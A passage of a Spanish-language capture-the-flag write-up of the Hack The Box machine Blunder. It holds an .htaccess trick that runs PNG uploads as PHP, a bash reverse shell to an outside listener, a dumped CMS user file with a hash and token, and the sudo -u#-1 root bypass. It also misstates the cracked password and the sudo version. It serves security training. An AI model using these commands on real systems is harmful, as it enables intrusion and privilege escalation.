# echo "AddType application/x-httpd-php .png" &gt;&gt; ".htaccess"
</code></pre></div></div>

<p>Lo siguiente es ponerse a la escucha con netcat</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nc -lvnp 443 "</span>
</code></pre></div></div>
<p>Ejecutamos el exploit y recibimos las shell, pero resulta que tenemos que enviarnos otra reverse_shell con el comando</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="s2">" bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.4/444 0&gt;&amp;1'     "</span>
</code></pre></div></div>
<p>Conseguimos una <code class="language-plaintext highlighter-rouge">Reverse-Shell</code> como <code class="language-plaintext highlighter-rouge">www-data</code> en el puerto 444
Hacemos un tratamiento de la <code class="language-plaintext highlighter-rouge">tty</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
<span class="nv">$ </span>ctrl Z
<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="nv">$ </span>reset
<span class="nv">$ </span>xterm
<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
</code></pre></div></div>
<p>Configuramos las rows y columns, chequeando con <code class="language-plaintext highlighter-rouge">stty -a</code>en nuestra terminal
<code class="language-plaintext highlighter-rouge">$ stty rows 51 columns 181</code></p>

<h1 id="escalada-de-privilegios-y-busqueda-de-la-flag-usertxt">Escalada de Privilegios y busqueda de la flag User.txt</h1>

<p>Enumeramos el sistema:
Encontramos dos usuarios <code class="language-plaintext highlighter-rouge">hugo</code> y <code class="language-plaintext highlighter-rouge">shaun</code>
<code class="language-plaintext highlighter-rouge">$ find \ -name user.txt 2&gt;/dev/null</code> y nos devuelve que el archivo se encuentra en el directorio de HUGO al cual no tenemos acceso
Ya sabemos que tenemos que convertirnos en el usuario HUGO
<code class="language-plaintext highlighter-rouge">$ grep -r -i "hugo" 2&gt;/dev/null</code> y en los dos primeros matches, encontramos dos archivos que hacen referencia a database, nos movemos a la ruta
listamos los ficheros curiosos y efectivamente:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="s2">$"www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases</span><span class="nv">$ </span><span class="s2">cat users.php"</span> 
&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
<span class="o">{</span>
    <span class="s2">"admin"</span>: <span class="o">{</span>
        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
        <span class="s2">"email"</span>: <span class="s2">""</span>,
        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
        <span class="s2">"twitter"</span>: <span class="s2">""</span>,
        <span class="s2">"facebook"</span>: <span class="s2">""</span>,
        <span class="s2">"instagram"</span>: <span class="s2">""</span>,
        <span class="s2">"codepen"</span>: <span class="s2">""</span>,
        <span class="s2">"linkedin"</span>: <span class="s2">""</span>,
        <span class="s2">"github"</span>: <span class="s2">""</span>,
        <span class="s2">"gitlab"</span>: <span class="s2">""</span><span class="o">}</span>

<span class="s2">"Password"</span>: <span class="s2">"Password120"</span>			contraseña crackeada con Crackstation
</code></pre></div></div>
<p>Ya podemos hacer un <code class="language-plaintext highlighter-rouge">su hugo</code> introducimos la password <code class="language-plaintext highlighter-rouge">Password210</code></p>

<h1 id="conseguir-el-privesc-para-el-usuario-root">Conseguir el Privesc para el usuario Root</h1>

<p>Encontramos que haciendo el siguiente comando para listar la version de sudo</p>

<p>Listando las versions de SUDO con el commando <code class="language-plaintext highlighter-rouge">apt list | grep “sudo”</code>
vemos la version de SUDO instalada 1.8.5</p>

<p>Buscamos por <code class="language-plaintext highlighter-rouge">Searchsploit</code> y resulta que hay para esa version una vulnerabilidad que salio hace poco llamada Security Bypass</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"sudo 1.8.27 - Security Bypass                                                          linux/local/47502.py	"</span>                                                                                    
</code></pre></div></div>
<p>Haciendo:  <code class="language-plaintext highlighter-rouge">$ sudo -u#-1 /bin/bash</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
root@blunder:/home/hugo# 
</code></pre></div></div>
<p>Lo conseguimos ya somos <code class="language-plaintext highlighter-rouge">root</code> y ya podriamos listar la flag <code class="language-plaintext highlighter-rouge">root.txt</code> en la ruta <code class="language-plaintext highlighter-rouge">/root/root.txt</code></p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/2021/05/12/Blunder-~-Hack-The-Box.html';
     this.page.identifier = '/2021/05/12/ Blunder ~ Hack The Box';
     this.page.title = 'Maquina  Retirada Blunder de Hack The Box (Necesario VIP)';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//bitbrain-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/06/27/Trick.html">
            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/15/Attacktive-Directory.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/05/Search-AD.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
  




<script>
  let i = 0;
  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BLUNDER';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
